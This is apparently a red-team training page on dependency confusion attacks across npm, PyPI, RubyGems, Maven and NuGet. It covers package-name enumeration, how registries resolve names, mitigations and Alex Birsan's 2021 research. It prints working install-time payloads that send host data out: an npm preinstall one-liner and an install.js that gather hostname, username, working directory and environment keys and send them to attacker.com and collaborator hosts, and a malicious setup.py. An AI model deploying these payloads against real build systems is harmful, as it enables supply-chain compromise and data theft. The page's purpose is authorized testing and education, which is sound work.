---
layout: training-page
title: "Dependency Confusion — Red Team Academy"
module: "Web Hacking"
tags:
  - dependency-confusion
  - supply-chain
  - npm
  - pypi
  - package-managers
page_key: "web-dependency-confusion"
render_with_liquid: false
---

# Dependency Confusion

A dependency confusion attack (also called a supply chain substitution attack) tricks a package installer into pulling a malicious package from a public registry instead of the intended internal package with the same name. When a company uses private packages, an attacker who registers a public package with the same name — and a higher version number — may cause automated build systems to fetch the malicious package instead.

## Tools

- **confused** — Checks for dependency confusion vulnerabilities across npm, pip, gem, and other package managers — `github.com/visma-prodsec/confused`
- **DepFuzzer** — Finds dependency confusion or projects where owner's email can be taken over — `github.com/synacktiv/DepFuzzer`

## How It Works

Package managers like npm, pip, gem, and Maven resolve dependencies by searching both internal (private) and external (public) registries. When the public registry returns a package with a higher version number than the internal one, many package managers prefer the public version by default.

Affected ecosystems:

- **JavaScript / Node.js** (npm) — `package.json`
- **Python** (PyPI) — `requirements.txt`, `setup.py`, `pyproject.toml`
- **PHP** (Composer) — `composer.json`
- **Java** (Maven) — `pom.xml`
- **Docker** — `Dockerfile` image references

## Attack Methodology

### Step 1 — Enumerate Internal Package Names

Find private package names used by the target organization. Common sources:

- Public GitHub repositories — look at `package.json`, `requirements.txt`, `composer.json`, `pom.xml`
- Job postings that mention internal tooling
- JavaScript bundles in the application that reference internal module names
- npm `package-lock.json` or `yarn.lock` files that list resolved registry URLs
- Error pages or stack traces that leak package paths

### Step 2 — Check if the Package Name is Unclaimed on Public Registries

Search [npmjs.com](https://www.npmjs.com), PyPI, RubyGems, or other relevant public registries for the internal package name. If it is not registered, the attack surface exists.

### Step 3 — Register the Public Package with a Higher Version

Create a public package with:

- The same name as the internal private package
- A version number higher than the internal version (e.g., `9999.0.0`)
- A payload in `install` scripts or the package code itself that exfiltrates data (DNS callback with hostname, username, etc.)

Example npm package payload skeleton (for authorized bug bounty testing only):

```
# package.json
{
  "name": "internal-package-name",
  "version": "9999.0.0",
  "description": "Dependency confusion PoC",
  "scripts": {
    "preinstall": "node -e \"require('dns').lookup(require('os').hostname(),function(e,a){require('http').get('http://callback.attacker.com/?d='+a+'&h='+require('os').hostname())})\""
  }
}
```

### Step 4 — Wait for Execution

When a developer or CI/CD pipeline installs dependencies, the package manager may pull the malicious public package instead of the internal one. The `preinstall` script executes automatically during installation, sending a callback to the attacker's server.

## Detection Signals

In bug bounty context, the callback will include identifying information about the victim environment:

```
# Typical callback received by attacker
GET /?d=10.10.20.5&h=build-server-prod-01 HTTP/1.1
Host: callback.attacker.com
```

## Mitigations

- Use a private package registry (Artifactory, GitHub Packages, Azure Artifacts) configured as the sole source — do not fall back to public registries
- Pin exact package versions and use lock files (`package-lock.json`, `Pipfile.lock`)
- Use scoped packages in npm (`@company/package-name`) — scoped packages are harder to squatter
- Register your internal package names on public registries as placeholders (with no real code)
- Use tools like `confused` to audit your dependency manifests

---

## Package Name Resolution Order — Deep Dive

### npm (Node.js)

When a developer runs `npm install`, npm resolves each dependency name against all configured registries in order. The default configuration uses only the public `registry.npmjs.org`. When a company configures a private registry (Verdaccio, Artifactory, GitHub Packages), the resolution order is:

1. If `.npmrc` specifies a private registry with `@scope`, scoped packages go to that registry.
2. Unscoped packages (e.g., `internal-utils`) default to the public registry **unless** the private registry is set as the global default.

Many enterprise configurations use Artifactory as a pass-through — it checks the internal namespace first, then proxies to npm if not found. If an attacker claims the name on npm, Artifactory may serve it since it finds the package on npm. The higher version wins.

```
# .npmrc that creates vulnerability — public registry as fallback
registry=https://artifactory.company.com/npm-proxy/
```

### pip (Python / PyPI)

pip uses a similar resolution mechanism with `--extra-index-url`. The critical flaw: when both `--index-url` (private) and `--extra-index-url` (public) are specified, pip selects the highest version across both sources, not the first source that has the package:

```
pip install --index-url https://internal.company.com/pypi/ \
            --extra-index-url https://pypi.org/simple/ \
            internal-package
```

If `internal-package==2.0.0` exists on the private registry and `internal-package==9999.0.0` exists on PyPI, pip installs from PyPI.

Secure alternative — use `--index-url` only (no `--extra-index-url`) and mirror all public dependencies through the internal registry.

### RubyGems

Gemfiles with a source block for private gems still fall back to rubygems.org for unscoped lookups. An attacker claiming the gem name on rubygems.org with a higher version causes substitution.

### Maven (Java)

Maven's POM resolution checks repositories in declaration order. If the internal Nexus repository is listed before Maven Central, packages not found internally are fetched from Central. A public `groupId:artifactId` with a higher version wins.

### NuGet (.NET)

NuGet resolves packages from all configured sources and takes the highest version. If a private feed is configured alongside nuget.org, any package name claimed on nuget.org with a higher version will be installed.

---

## Discovering Internal Package Names

### JavaScript Bundle Analysis

When a web application loads JavaScript, the bundle often contains `require()` calls or import statements referencing internal package names. Use browser DevTools or a downloaded bundle:

```
# Download JS bundle
curl -s https://target.com/static/app.bundle.js -o bundle.js

# Search for internal package patterns
grep -oP "require\(['\"]([^'\"]+)['\"]" bundle.js | sort -u
grep -oP "from ['\"]([^'\"]+)['\"]" bundle.js | sort -u
```

Look for package names that:
- Match the company name or abbreviation
- Are not present on npmjs.com
- Appear in multiple `require` calls (not third-party utilities)

### Source Maps

If source maps are available (`.js.map` files), they may contain the original file structure and `node_modules` paths, revealing exact package names:

```
curl https://target.com/static/app.bundle.js.map | python3 -m json.tool | grep '"sources"' -A 50
```

### package.json in Exposed Repositories

```
# GitHub search for org's package.json files
gh search code --owner target-org "dependencies" --filename package.json

# Look at package-lock.json for resolved registry URLs — reveals private registry names
gh search code --owner target-org "resolved" --filename package-lock.json
```

### .npmrc Files

`.npmrc` files often specify registry URLs including private registry scopes. Public `.npmrc` files in repos reveal internal package scopes:

```
gh search code --owner target-org "@company" --filename .npmrc
```

### Error Messages

Stack traces in 5xx errors sometimes include full module paths like:
```
Error: Cannot find module '@company/internal-auth'
```

---

## Payload Options

### preinstall vs postinstall

The `preinstall` hook runs before the package is installed. The `postinstall` hook runs after. Both execute with the privileges of the user running npm:

```json
{
  "scripts": {
    "preinstall": "node -e \"...exfil...\"",
    "postinstall": "node -e \"...exfil...\""
  }
}
```

`preinstall` is preferred for PoC because it runs before any code inspection might catch it.

### DNS-Only Exfiltration (Bug Bounty Safe)

For authorized testing — use DNS-only callbacks to avoid transmitting sensitive data:

```json
{
  "scripts": {
    "preinstall": "node -e \"const d=require('dns');const o=require('os');d.lookup(o.hostname()+'.depconfusion.YOUR-DOMAIN.com',()=>{})\""
  }
}
```

### More Complete Exfiltration Payload

```javascript
// install.js — run via "preinstall": "node install.js"
const dns = require('dns');
const os = require('os');
const http = require('http');

const info = {
  hostname: os.hostname(),
  platform: os.platform(),
  username: os.userInfo().username,
  cwd: process.cwd(),
  env_keys: Object.keys(process.env).join(','),
};

// DNS callback — encodes hostname in subdomain
const encoded = Buffer.from(JSON.stringify(info)).toString('hex').slice(0, 60);
dns.lookup(`${encoded}.your-collaborator.oastify.com`, () => {});

// HTTP callback
http.get(`http://your-collaborator.oastify.com/?data=${encodeURIComponent(JSON.stringify(info))}`);
```

---

## Scoped Package Bypass

Scoped packages (`@company/package`) are registered under an npm organization (scope). The scope owner controls all package names under it. This is more secure because an attacker cannot register `@company/internal-utils` without owning the `@company` npm organization.

However, the attack works if:
1. The company has not registered the `@company` scope on npm.
2. The internal `.npmrc` is misconfigured to fall through to public npm for scoped packages.

Check if a scope is unclaimed:

```
curl https://registry.npmjs.org/@company/
# If 404 — scope is not registered on npm
```

Some companies use internal packages **without** scoping (e.g., `internal-utils` instead of `@company/internal-utils`). These are straightforwardly vulnerable.

---

## pip (PyPI) Variant

Discover internal Python packages from leaked `requirements.txt` or `pyproject.toml` files:

```
gh search code --owner target-org "" --filename requirements.txt
gh search code --owner target-org "" --filename pyproject.toml
```

Check if internal package names exist on PyPI:

```
pip index versions internal-package-name 2>&1
# If "No matching distribution found" — unclaimed
```

Register on PyPI and add malicious `setup.py`:

```python
# setup.py
from setuptools import setup
import subprocess, sys

subprocess.Popen([sys.executable, '-c',
    "import os,socket,urllib.request;"
    "urllib.request.urlopen('http://attacker.com/?h='+socket.gethostname())"
])

setup(name='internal-package-name', version='9999.0.0')
```

---

## RubyGems Variant

Search for internal gem names in Gemfiles:

```
gh search code --owner target-org "" --filename Gemfile
```

Check RubyGems.org:

```
curl https://rubygems.org/api/v1/gems/internal-gem-name.json
# 404 = unclaimed
```

Create and publish a gem with a malicious `extconf.rb` or `Rakefile` that fires during installation.

---

## Real-World Example — Alex Birsan 2021

In February 2021, security researcher Alex Birsan published "Dependency Confusion: How I Hacked Into Apple, Microsoft and Dozens of Other Companies." His research demonstrated that:

- Over 35 companies including Apple, Microsoft, PayPal, Shopify, Netflix, Tesla, and Uber were vulnerable.
- By finding internal package names from public npm manifests, error messages, and GitHub, he registered identically named packages on npm and PyPI with higher version numbers.
- When CI/CD pipelines ran `npm install` or `pip install`, they downloaded his packages and executed his callback scripts.
- Several companies paid significant bug bounties for this class of finding.

The key insight: corporate build systems had configured private registries as fallbacks but not as exclusive sources, and they had not registered their internal package names as placeholder entries on public registries.

---

## Detecting Vulnerable Configurations

Use `confused` to audit your own dependencies:

```
# Check npm dependencies in package.json
confused -l npm package.json

# Check pip dependencies in requirements.txt
confused -l pip requirements.txt

# Check gem dependencies in Gemfile
confused -l gem Gemfile
```

Output flags packages that exist in your manifests but are not claimed on the corresponding public registry.

---

## Resources

- confused — `github.com/visma-prodsec/confused`
- DepFuzzer — `github.com/synacktiv/DepFuzzer`
- Dependency Confusion: How I Hacked Into Apple, Microsoft and Dozens of Other Companies — Alex Birsan
- Exploiting Dependency Confusion — Aman Sapra (0xsapra)
- 3 Ways to Mitigate Risk When Using Private Package Feeds — Microsoft Azure
- npm Docs: Configuring npm for use with a private registry — `docs.npmjs.com`
- pip Documentation: --extra-index-url — `pip.pypa.io/en/stable/cli/pip_install/`
